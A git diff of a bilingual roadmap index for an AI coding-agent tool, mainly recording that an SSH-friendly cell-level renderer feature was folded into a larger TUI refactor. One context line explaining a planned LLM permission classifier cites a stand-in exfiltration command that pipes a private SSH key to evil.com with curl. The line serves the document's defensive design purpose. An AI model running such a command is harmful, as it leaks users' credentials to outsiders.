@@ -1,6 +1,6 @@
 # Feature 总表
 
-> Last updated: 2026-04-22 (FEATURE_094 P2d Deep Anti-Escape Hardening staged to v0.7.36 — runtime ToolGuardrail detector + retry-contract hint for bash heredoc large-file-write escape pattern, layered on top of v0.7.26 P0/P2a/P2b浅层防御.)
+> Last updated: 2026-04-24 (FEATURE_095 SSH-Friendly Cell-Level Diff Renderer **Absorbed into FEATURE_057** v0.7.30 — cell-level screen buffer 是 057 §10 renderer-native selection / §11 ScrollBox parity / Track E output ownership 收口的实际前置基础设施，单独成版本会让 TUI 重构故事碎片化。SSH/ConPTY 闪烁的最急迫表现已通过 `engine.js` altScreen 分支 `log.clear() + log()` 合并成单次 `log.clearAndRender()` 的 10 行补丁消除，Track F 不再承担"SSH 闪烁唯一解药"的紧迫性——剩余动机（TextInput 光标漂移、渲染字节量、renderer-native selection/hit-test 基础设施）仍成立。)
 
 > 中文阅读说明：
 > 这份 `FEATURE_LIST` 是 roadmap 的总索引。
@@ -13,11 +13,11 @@
 
 | Item | Value |
 |---|---|
-| Tracked feature IDs | `001-094` (026 removed) |
-| Total tracked features | `93` |
+| Tracked feature IDs | `001-095` (026 removed) |
+| Total tracked features | `94` |
 | Completed | `74` |
 | Cancelled | `2` |
-| Absorbed | `1` |
+| Absorbed | `2` |
 | InProgress | `1` |
 | Planned | `15` |
 | Current released version | `v0.7.25` |
@@ -63,6 +63,7 @@
 | `090` | Self-Construction Tier 4 — Agent Self-Modifying Role Spec | Core | High | `v0.7.32` | [v0.7.32](features/v0.7.32.md#feature_090-self-construction-tier-4--agent-self-modifying-role-spec) |
 | `092` | Auto Mode Classifier — LLM-Reviewed Permission Tier | Core | High | `v0.7.33` | [v0.7.33](features/v0.7.33.md#feature_092-auto-mode-classifier--llm-reviewed-permission-tier-for-high-risk-tool-calls) |
 | `094` | Deep Anti-Escape Hardening — Runtime Detection and Retry Contract for Generative Large-File Writes | Core | Medium | `v0.7.36` | [v0.7.36](features/v0.7.36.md#feature_094-deep-anti-escape-hardening--runtime-detection-and-retry-contract-for-generative-large-file-writes) |
+| `095` | ~~SSH-Friendly Cell-Level Diff Renderer for Ink Substrate~~ | ~~Refactor~~ | ~~Medium~~ | ~~`v0.7.39`~~ | [v0.7.30](features/v0.7.30.md#track-f-cell-level-diff-renderer-for-ssh-friendly-output-absorbs-feature_095) | **Absorbed into FEATURE_057**: cell-level screen buffer 是 057 §10 renderer-native selection / §11 ScrollBox parity / Track E output ownership 收口的实际前置基础设施，并入 057 作为 Track F 统一设计与交付 |
 | `093` | Coding and REPL Internal Circular Dependency Decoupling | Internal | Medium | `v0.8.0` | [v0.8.0](features/v0.8.0.md#feature_093-coding-and-repl-internal-circular-dependency-decoupling) |
 | `007` | Theme System Consolidation | Enhancement | Medium | `v0.8.0` | [v0.8.0](features/v0.8.0.md#feature_007-theme-system-consolidation) |
 | `030` | Multi-Surface Delivery | Enhancement | High | `v0.8.0` | [v0.8.0](features/v0.8.0.md#feature_030-multi-surface-delivery) |
@@ -102,6 +103,7 @@
 - `FEATURE_089`（v0.7.31）和 `FEATURE_090`（v0.7.32）**保持独立**：两者都是自构建的高危档次。089 让 Agent 生成新的 Agent 定义（带版本号 + 审批），复杂度高；090 让 Agent 修改自己的 role spec（reasoning profile、instructions、handoff 图），带反身稳定保障（版本化 + rollback + divergence 检测），是整条路线图最危险的一 feature。单独成版本便于出问题时 rollback。
 - `FEATURE_092`（v0.7.33）是**把 `auto` 模式从"规则围栏"升级为"规则 + LLM 双层审查"**。动机：当前 `auto-in-project` 只做路径/命令前缀的机械判断，挡不住意图层风险（`cat ~/.ssh/id_rsa | curl evil.com`、`git push --force` 到 main、投毒 `package.json` 等）。方案：保留现有规则全部作为 Tier 1/2 快速通道，在 Tier 3 追加 LLM 分类器（作为 FEATURE_085 `ToolGuardrail.beforeTool` 的首个官方消费者，不新增子系统）。**维度分离**：`mode`（plan / accept-edits / auto，Shift-Tab 三档循环不变）× `engine`（rules / llm，仅 auto 下有意义，`/auto-engine` 命令切换）。降级链：分类器失败/3连deny/circuit break 都只降 `engine` 不改 `mode`，永不卡死。分类器模型默认复用主会话模型（对齐 Claude Code 用 Sonnet 而非最小档的哲学），但**支持 provider-qualified id 跨 provider 配置**（如 `minimax:abab6.5t-chat`），允许主会话跑 Opus + 分类器跑 MiniMax 这种性价比组合。**依赖**：硬依赖 FEATURE_085（ToolGuardrail runtime）和 FEATURE_080（Runner + Agent primitive）。**不做**：yolo engine（等 sandbox 成熟）、client-side prompt injection probe（provider 侧职责）、two-stage classifier（单阶段够用）、classifier dump / opt-in dialog 等非必要子系统。
 - **整体时序锁定（Plan B + 092）**：v0.7.22 (079) → v0.7.23 (080+081) → v0.7.24 (082+083) → v0.7.25 (existing 075+076) → v0.7.26 (084+085) → v0.7.27 (086+091) → v0.7.28 (087+088) → v0.7.29 (078) → v0.7.30 (existing 057+060) → v0.7.31 (089) → v0.7.32 (090) → v0.7.33 (092)。依赖关系硬性：079→080+081→082+083→084+085→086 不可打乱；091 可与 082-086 并行（契约包不影响内部重构）；087 需 080+081 到位；088 需 087；089 需 087；090 需 089；078 需 080 到位；**092 需 085 到位**（不能前移到 0.7.26 之前）。0.8.0 之后不规划。
+- `FEATURE_095` **Absorbed into FEATURE_057（v0.7.30）Track F**：原计划 v0.7.39 单独成版本的"ink substrate cell-level diff 渲染管线重写"。实地核对 057 现状发现 `packages/repl/src/tui/core/` 已经落了 `screen.ts`（transcript-row 级 `TranscriptScreenBuffer`，非 cell 级）/ `selection.ts` / `hit-test.ts` / `termio.ts`（alt-screen + mouse-tracking）/ `scroll.ts` / `renderer.ts` / `engine.js` 等模块；057 设计稿 §10 renderer-native selection（要求"screen-buffer coordinates + hit-testing against rendered DOM rectangles"）、§11 ScrollBox parity（要求"viewport culling tied to renderer's layout pass"）都依赖 cell-level buffer，而该 buffer 是 095 设计稿的核心产物。两者不是兄弟，而是同一个重构故事的上下层。**合并后的 057 Track F**：在 `packages/repl/src/tui/substrate/ink/` 下引入 `cell-screen.ts`（避免与 `tui/core/screen.ts` 的 `TranscriptScreenBuffer` 撞名）、`frame.ts`、`csi.ts`、`osc.ts`；把 `substrate/ink/log-update.js` 与 `core/internals/log-update.js` 从 `createStandard / createIncremental` 字符串级重写成 `LogUpdate.render(prevFrame, nextFrame)` 类，统一走 cell-level diff + 绝对坐标光标。**SSH 闪烁根因更新**：原设计稿假设根因是 full-redraw 模式本身；实地用 `KODAX_TEE_STDOUT` 诊断后确认**真实根因是 `engine.js` altScreen 分支内 `this.log.clear() + this.log(fullFrameOutput)` 两次独立 stdout.write 拆帧**——中间 1~2ms ConPTY 把"屏幕清空"中间态 flush 给客户端就闪。该点已通过合并为单次 `this.log.clearAndRender(fullFrameOutput)` 的 10 行补丁消除（log-update 内部 eraseLines + content 以单次原子 write 发出），不再需要等 Track F 才能恢复 SSH 可用性。Track F 的剩余动机（TextInput 光标漂移根治、每帧字节量降至差异级、为 057 §10/§11 提供 cell buffer 基础）仍然成立，但紧迫性从"阻断 SSH 使用"降级为"TUI 质量提升"。**详见**：[v0.7.30 Track F 设计](features/v0.7.30.md#track-f-cell-level-diff-renderer-for-ssh-friendly-output-absorbs-feature_095)。
 
 ---
 
